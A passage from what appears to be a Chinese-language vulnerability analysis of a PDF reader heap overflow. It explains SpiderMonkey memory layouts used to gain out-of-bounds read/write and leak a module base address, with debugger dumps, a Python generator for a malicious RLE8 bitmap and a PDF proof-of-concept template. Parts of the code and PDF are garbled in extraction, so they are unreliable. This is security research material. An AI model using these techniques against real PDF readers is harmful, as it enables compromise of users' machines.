    34d54ff0  00000000 00000000 00000000 00000000
在漏洞利用过程中，如果可以更改 `ArrayBuffer` 对象的 `byteLength` 为一个更大的值，那么就可以基于 `ArrayBuffer`
对象实现越界读写了。不过需要注意后面的 `4` 字节数据要么为零，要么指向一个 **合法** 的 `DataView` 对象，否则进程会立刻崩溃。
#### 5.2.2 ARRAY
对 [Array](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array) 而言，当 `length` 的大小超过
`14` 时，其底层元素存储区所在的堆块将通过系统堆申请（`ucrtbase!calloc`）；当 `length` 的大小小于等于 `14` 时，堆块从
SpiderMonkey 的私有堆 **nursery heap** 申请。和 `ArrayBuffer`
一样，当底层元素存储区独立申请堆块时，需要额外申请 `0x10` 字节的空间用于存储 `ObjectElements` 对象。
    class ObjectElements {
     public:
      // The NumShiftedElementsBits high bits of this are used to store the
      // number of shifted elements, the other bits are available for the flags.
      // See Flags enum above.
      uint32_t flags;
      /*
       * Number of initialized elements. This is  dd 34cb0f88-10 L90/4
    34cb0f78  00000000 0000000f 0000000f 0000000f
    34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]
    34cb0f98  00000000 ffffff84 00000000 ffffff84
    34cb0fa8  00000000 ffffff84 00000000 ffffff84
    34cb0fb8  00000000 ffffff84 00000000 ffffff84
    34cb0fc8  00000000 ffffff84 00000000 ffffff84
    34cb0fd8  00000000 ffffff84 00000000 ffffff84
    34cb0fe8  00000000 ffffff84 00000000 ffffff84
    34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]
这里 `array[0]` 和 `array[14]` 的值都是 `41424344 ffffff81` ，其中标签 `0xFFFFFF81`
表示元素的类型为 `INT32` 。而 `array[1]` 到 `array[13]` 之间的所有元素都被填充为 `00000000 ffffff84`
，表示这些元素当前是未定义的（即 `undefined` ）。
对 `Array` 而言，如果可以通过触发漏洞更改 `capacity` 和 `length` 的值，那么就可以实现越界写操作：仅仅是越界写，因为
`initializedLength` 不变的话越界读取的元素全部为 `undefined`
，同时一旦进行越界写操作，`initializedLength` 之后到越界写之前的所有元素都会被填充为 `00000000 ffffff84`
，控制不好的话很容导致进程崩溃。
那么如果同时更改 `initializedLength` 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为
`initializedLength` 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC
过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。
#### 5.2.3 JSOBJECT
在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 `JSObject` ，后者又继承自 `ObjectImpl`
，相关定义如下：
    class ObjectImpl : public gc::Cell {
      protected:
        HeapPtrShape shape_;
        HeapPtrTypeObject type_;
        HeapSlot *slots;
        HeapSlot *elements;
      // ......
    };
    struct JSObject : public js::ObjectImpl {}
对某些对象（比如 `DataView` ）而言， `elements` 的值是没有意义的，因此会指向一个静态全局变量
`emptyElementsHeader` ，读取这些对象的 `elements` 的值可以用于泄露 JavaScript 引擎模块的基地址。
    static ObjectElements emptyElementsHeader(0, 0);
    /* Objects with no elements share one empty set of elements. */
    HeapSlot *js::emptyObjectElements =
        reinterpret_cast(uintptr_t(&emptyElementsHeader) + 
        sizeof(ObjectElements));
### 5.3 位图构造
如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    import os
    import sys
    import struct
    RLE8 = 1
    RLE4 = 2
    COMPRESSION = RLE8
    BIT_COUNT = 8
    CLR_USED = 1 ' % os.path.basename(sys.argv[0])
            sys.exit(1)
        generate_bitmap(sys.argv[1])
这里直接创建一个 RLE8 位图文件，相关参数如下：
  * 宽度为 `0xF0`
  * 高度为 `1`
  * 位数为 `8`
对该位图而言，用于存储位图数据的堆块的大小将会是 `0xF0` ，而函数 `get_bitmap_data`
中指定的位图数据将使得我们可以向低地址方向越界写 `0xF4` 字节的数据，其中数据全部为 `0x10` 。
### 5.4 PDF 构造
下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。
    %PDF-1.7
    1 0 obj
    >
        >>
    >>
    endobj
    2 0 obj
    >
    endobj
    3 0 obj
    >
            >>
        >>
    >>
    endobj
    4 0 obj
    >
    stream
    BT
    /F1 12 Tf
    90 692 Td
    (If you see this page, it means that your PDF reader does not support XFA.) Tj
    ET
    endstream
    endobj
    5 0 obj
    >
    endobj
    6 0 obj
    >
    stream
    __IMAGE_BASE64_DATA__